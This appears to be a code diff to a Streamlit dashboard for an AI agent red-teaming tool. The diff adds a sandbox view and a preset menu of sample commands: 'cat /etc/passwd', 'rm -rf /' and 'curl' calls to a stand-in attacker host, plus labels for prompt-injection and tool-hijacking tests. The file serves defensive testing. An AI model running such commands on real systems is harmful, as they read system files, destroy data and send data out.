@@ -3,11 +3,6 @@ ASTRAXIS-AI Interactive Cyber Security Streamlit Web Application.
 
 Provides a live visual dashboard for red-teaming AI agent systems,
 visualizing attack graphs, launching container sandbox runs, and inspecting SHA-256 reports.
-
-Key Concept — Live Streamlit Dashboard:
-    Streamlit creates interactive web apps directly in Python.
-    Users can trigger full red-team scans, view dynamic graphs, execute sandbox payloads,
-    and download cryptographic audit reports live in their browser.
 """
 from __future__ import annotations
 
@@ -38,7 +33,7 @@ inject_glass_theme()
 # Header Banner
 st.markdown('<div class="cyber-title">🛡️ ASTRAXIS-AI</div>', unsafe_allow_html=True)
 st.markdown(
-    '<p style="color: #8A99AD; font-size: 1.05rem;">'
+    '<p style="color: #8A99AD; font-size: 1.1rem; font-weight: 500;">'
     'Autonomous Multi-Agent AI Red-Teaming, Exploit Simulation & Sandbox Infrastructure'
     '</p>',
     unsafe_allow_html=True
@@ -81,13 +76,13 @@ if nav_selection == "🚀 Automated Red-Team Audit Scan":
     st.markdown('<div class="glass-card">', unsafe_allow_html=True)
     st.subheader("🚀 Live Multi-Agent Red-Team Audit Pipeline")
     st.write(
-        "Run an automated end-to-end audit scan across all 7 synthetic agent nodes. "
+        "Run an automated end-to-end audit scan across all synthetic agent nodes. "
         "Evaluates prompt injection, tool hijacking, graph path traversal, and container sandbox isolation."
     )
 
     col1, col2 = st.columns([1, 3])
     with col1:
-        if st.button("🔥 Launch Red-Team Scan", type="primary", use_container_width=True):
+        if st.button("🔥 Launch Full Red-Team Scan", type="primary", use_container_width=True):
             with st.spinner("Executing multi-agent exploit simulations..."):
                 engine = OrchestratorEngine(force_sandbox_backend=backend_enum)
                 res = engine.run_full_audit()
@@ -110,6 +105,7 @@ if nav_selection == "🚀 Automated Red-Team Audit Scan":
         with m5:
             st.markdown(f'<div class="metric-box"><div class="metric-val">{res.violations}</div><div class="metric-lbl">Policy Violations</div></div>', unsafe_allow_html=True)
 
+        st.markdown("<br>", unsafe_allow_html=True)
         st.markdown("### 🔒 Cryptographic Fingerprint Verification")
         st.code(f"SHA-256 Fingerprint: {res.sha256_hash}", language="text")
 
@@ -122,7 +118,9 @@ elif nav_selection == "🎯 Adversarial Payload Suite":
     st.markdown(f"**Loaded Payload Suite Size:** `{len(payloads)} Active Scenarios`")
 
     for p in payloads:
+        badge_class = "badge-critical" if p.severity == "critical" else ("badge-high" if p.severity == "high" else "badge-success")
         with st.expander(f"🔴 [{p.severity.upper()}] {p.category.value.upper()} - Payload #{p.payload_id[:8]}"):
+            st.markdown(f"**Severity:** <span class='{badge_class}'>{p.severity.upper()}</span>", unsafe_allow_html=True)
             st.markdown(f"**Description:** {p.description}")
             st.code(p.content, language="text")
 
@@ -139,7 +137,7 @@ elif nav_selection == "🕸️ NetworkX Attack Graph Analyzer":
     c1, c2, c3 = st.columns(3)
     c1.metric("Architecture Nodes", summary["total_nodes"])
     c2.metric("Directed Edges", summary["total_edges"])
-    c3.metric("Exploit Paths Found", summary["total_exploit_paths"])
+    c3.metric("Exploit Paths Discovered", summary["total_exploit_paths"])
 
     st.markdown("### 📍 Top Discovered Exploit Paths")
     for p in paths:
@@ -147,13 +145,50 @@ elif nav_selection == "🕸️ NetworkX Attack Graph Analyzer":
 
 # View 4: Container Sandbox Isolation Engine
 elif nav_selection == "🐳 Container Sandbox Isolation Engine":
+    st.markdown('<div class="glass-card">', unsafe_allow_html=True)
     st.subheader("🐳 Interactive Container Sandbox Executor")
+    st.write(
+        "Test how the sandbox isolates and intercepts untrusted agent tool calls. "
+        "Enter any test command below or click a sample command to see sandbox protection in real time."
+    )
+
+    st.markdown("💡 **Sample Test Commands to Try:**")
+    st.markdown(
+        "• `<span class='sample-cmd'>python -c 'print(1+1)'</span>` (Safe Python calculation)<br>"
+        "• `<span class='sample-cmd'>cat /etc/passwd</span>` (Path traversal exploit attempt)<br>"
+        "• `<span class='sample-cmd'>rm -rf /</span>` (Destructive command deletion attempt)<br>"
+        "• `<span class='sample-cmd'>curl http://attacker.com</span>` (Network exfiltration attempt)",
+        unsafe_allow_html=True
+    )
+    st.markdown("</div>", unsafe_allow_html=True)
+
     manager = SandboxManager(force_backend=backend_enum)
 
-    cmd_input = st.text_input("Enter command to execute in sandbox:", value="python -c 'print(1+1)'")
-    if st.button("Run Command in Sandbox"):
+    # Preset sample selection helper
+    preset = st.selectbox(
+        "Select a Quick Sample Command (or type a custom command below):",
+        [
+            "Custom Input",
+            "python -c 'print(\"ASTRAXIS-AI Sandbox Active!\")'",
+            "cat /etc/passwd",
+            "rm -rf /",
+            "curl http://attacker.com/cmd"
+        ]
+    )
+
+    default_cmd = "python -c 'print(1+1)'" if preset == "Custom Input" else preset
+
+    cmd_input = st.text_input("Enter command to execute in sandbox:", value=default_cmd)
+
+    if st.button("🚀 Run Command in Sandbox", type="primary"):
         with st.spinner("Executing inside container boundary..."):
             result = manager.execute_payload(cmd_input)
+            st.markdown("### 📊 Execution Result & Telemetry")
+            if result.is_success:
+                st.success(f"✅ Success (Exit Code 0) - Backend: {result.backend.value.upper()}")
+            else:
+                st.error(f"🔴 Blocked / Error (Exit Code {result.exit_code}) - Backend: {result.backend.value.upper()}")
+            
             st.json(result.to_dict())
 
 # View 5: Tamper-Proof Audit Report Exporter
